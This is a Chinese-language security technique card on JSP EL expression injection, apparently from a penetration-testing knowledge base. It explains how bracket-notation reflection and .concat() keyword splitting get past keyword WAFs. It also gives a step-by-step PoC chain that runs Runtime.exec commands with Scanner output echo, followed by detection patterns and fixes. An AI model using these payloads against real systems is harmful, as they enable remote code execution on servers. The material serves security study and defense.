---
id: web-java-expression-el-injection-waf-bypass-scanner-echo
title: JSP EL 表达式注入的 WAF 绕过与 Scanner 回显
type: scenario
domain: web
path: web/java/expression
technique: el-injection-bracket-concat-reflection
aliases:
- EL 表达式注入
- JSP EL RCE
- EL WAF 绕过
- 方括号反射调用绕过
- 字符串拼接绕过关键字
- pageContext 过滤绕过
- Scanner 回显 EL
tags:
- java
- el
- expression-injection
- jsp
- waf-bypass
- reflection
- runtime
- scanner
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V11
  verified_at: '2026-11-05T01:18:58+08:00'
  notes: 已对照原文及24张图核对；${3-1}→2、方括号getClass/forName、concat拆分Runtime、getMethod省略null、Scanner回显链均与截图一致。PO C示例用whoami替代原文cmd.exe /c echo success，属等价泛化；未在目标环境复测。
---

## 一句话结论

当应用把用户输入放进 `${...}` 作为 JSP EL 求值时，若 WAF 只按字面关键字（`Runtime`、`pageContext`、`script`）拦截，可用 `''.getClass()['forName'](...)` 从 String 类起步、用方括号方法调用和 `.concat()` 拆分关键字，绕过过滤后反射调用 `Runtime.exec`，再用 `Scanner` 读取进程输出实现回显。

## 原理

- JSP EL 以 `${...}` 包裹表达式，由 EL 引擎解析并求值。应用若把请求参数直接拼进 EL（如 `eval("${" + number + "}")` 或模板中直接输出用户输入），就会执行任意 EL 表达式。
- EL 支持 `.` 和 `[]` 两种属性/方法访问方式：`obj.foo` 等价于 `obj["foo"]`。方括号允许使用字符串（包括 `.concat()` 拼接出的字符串）作为方法名，因此可以在请求里不出现被 WAF 拦截的完整关键字。
- 从任意对象起步即可获得 `Class`：`''.getClass()` 返回 `java.lang.String` 的 `Class` 对象；`Class.forName(String)` 可以加载任意类。即使 `pageContext` 等隐式对象被拦截，也不影响从字符串/字面量起步。
- 反射链：`Class.forName("java.lang.Runtime")` → `Class.getMethod("getRuntime")` → `Method.invoke(null)` 得到 `Runtime` 单例 → `Runtime.exec(cmd)` 得到 `Process` → `Process.getInputStream()` 得到输出流。
- 回显：`new java.util.Scanner(InputStream).useDelimiter("\\A").next()` 把整个输入流读成一个字符串，作为 EL 表达式的结果返回给页面，从而把命令输出带出来。也可以用 `BufferedReader`/`StreamUtils` 等等价方式。
- WAF 绕过成立的关键是“WAF 检查的是原始请求字符串，而 EL 引擎在求值时才拼接/解析”；只要最终表达式语义正确，拆分后的字符串不会命中关键字黑名单。

## 触发条件

- 应用存在 EL 求值入口：用户输入被拼进 `${...}` 或直接交给 EL 引擎解析（常见于自定义“计算器/表达式求值”接口、模板渲染、日志/回显点）。
- 当前上下文能访问 `java.lang.Runtime` 等类（未启用 EL 的类白名单/沙箱，或沙箱可绕过）。
- WAF 基于字面关键字/正则，而不是语法级解析或 EL 沙箱；且未禁用方括号、反射、`Class.forName`。
- 需要回显时，目标 EL 引擎支持构造 `Scanner`/读取 `InputStream`；无回显场景只能盲打（写文件、DNS/HTTP 外带等）。

## 利用步骤

1. 确认 EL 求值：提交 `${3-1}`，若返回 `2` 说明 EL 被执行；`${''.getClass()}` 返回 `class java.lang.String` 说明可从字面量起步。
2. 探测 WAF 关键字：分别提交含 `Runtime`、`pageContext`、`script` 的 payload，记录被拦截的关键词。
3. 用方括号替换点号：`''.getClass()['forName'](...)`、`...['getMethod'](...)`、`...['invoke'](...)`。
4. 拆分被拦截的关键字：`'java.lang.Run'.concat('time')`、`'getR'.concat('untime')`；命令中的空格可用 `%20` 或拼接绕过。
5. 反射调用 `getRuntime` 时，`getMethod` 的无参方法不要传 `null` 作为参数类型——EL 会把 `null` 当作“一个 null 参数”，导致 `NoSuchMethodException: getRuntime(null)`；直接只传方法名即可。
6. 执行命令并取回显：把 `exec(cmd)` 的 `Process` 传给 `Scanner`，`useDelimiter('\\A').next()` 读取全部输出。
7. 若 `Runtime` 被完全禁用，可换 `ProcessBuilder`、`ScriptEngine`、`URLClassLoader`、`ClassLoader.defineClass` 等 sink；若 EL 沙箱限制类加载，则需先找沙箱绕过。

## PoC

```text
# 1. 确认 EL 执行
number=${3-1}
# 响应：Your Number Result: 2

# 2. 从字面量拿到 Class（不依赖 pageContext）
number=${''.getClass()['forName']('java.lang.Run'.concat('time'))}
# 响应：class java.lang.Runtime

# 3. 反射拿 Runtime 实例（注意 getMethod 只传方法名，不要传 null）
number=${''.getClass()['forName']('java.lang.Run'.concat('time'))['getMethod']('getR'.concat('untime'))['invoke'](null)}
# 响应：java.lang.Runtime@...

# 4. 执行命令（无回显，返回 Process 对象）
number=${''.getClass()['forName']('java.lang.Run'.concat('time'))['getMethod']('getR'.concat('untime'))['invoke'](null)['exec']('whoami')}
# 响应：java.lang.ProcessImpl@...

# 5. Scanner 回显（完整链）
number=${''.getClass()['forName']('java.util.Scanner')['getConstructor'](''.getClass()['forName']('java.io.InputStream'))['newInstance'](''.getClass()['forName']('java.lang.Run'.concat('time'))['getMethod']('getR'.concat('untime'))['invoke'](null)['exec']('whoami')['getInputStream']())['useDelimiter']('\\A')['next']()}
# 响应：当前用户名（命令输出）
```

```text
# Windows 下命令含空格时对空格做 URL 编码：
# exec('cmd.exe%20/c%20whoami')
# 或使用无空格命令（如 whoami、hostname）。
```

## 变体与关联

- 变体：`getMethod` 的第二个参数（参数类型数组）在无参方法时必须省略；传 `null` 会被 EL 解析为一个 null 参数，传空数组/`getComponentType()` 的结果也可能被当成一个参数，需按目标 EL 实现测试。
- 变体：关键字拆分不限于 `.concat()`，也可用 `StringBuilder`、`String.join`、字符数组拼接、方括号索引 `'Runtime'[0]` 等；WAF 若归一化字符串则可能失效。
- 变体：回显可用 `Scanner`、`BufferedReader`、`StreamUtils.copyToString`、`IOUtils.toString` 等；无回显时改用写文件、DNS/HTTP 外带、时间盲注。
- 变体：Unicode `\uXXXX` 与八进制转义在部分 EL 解析器中会报 `TreeBuilderException`/`lexical error`，不一定可用；`ScriptEngine` 依赖 Nashorn/GraalJS 是否可用。
- 关联：[[web-java-expression-spel-waf-bypass-scriptengine-reflection]]（SpEL 场景的同类 WAF 绕过与反射思路）；[[web-java-expression-spel-no-echo-exfil-streamutils]]（无回显时的输出外带）；`web/java/expression` 下的 OGNL/MVEL 注入卡片。
- 边界：EL 引擎启用类白名单/沙箱、禁用反射与 `Class.forName`、或 WAF 做语法级解析时，本链可能失效；`Runtime.exec` 的命令拆分在 Linux/Windows 下行为不同，带参数命令建议用 `String[]` 或 `ProcessBuilder`。

## 检测与防御

- 检测：请求参数中出现 `${`、`#{}`、`getClass`、`forName`、`getMethod`、`invoke`、`Runtime`、`ProcessBuilder`、`Scanner`、`concat` 等组合；响应体出现 `class java.lang.`、`java.lang.Runtime@`、`ProcessImpl@` 等对象字符串；EL 求值接口的异常栈（`ELException`、`MethodNotFoundException`）。
- 修复：不要把用户输入拼进 EL；必须求值时使用 `SimpleEvaluationContext` 或显式的白名单变量/函数，禁用类型引用、反射、`Class.forName`、`Runtime`。
- 加固：WAF 做语法级检测而非仅关键字；对表达式求值接口做认证、限流与输入长度限制；升级 EL 实现并启用沙箱。
- 注意：仅过滤 `Runtime`、`pageContext` 等关键词不足以防御，方括号 + 字符串拼接可以轻易绕过；必须在表达式引擎层面限制可访问的类与方法。
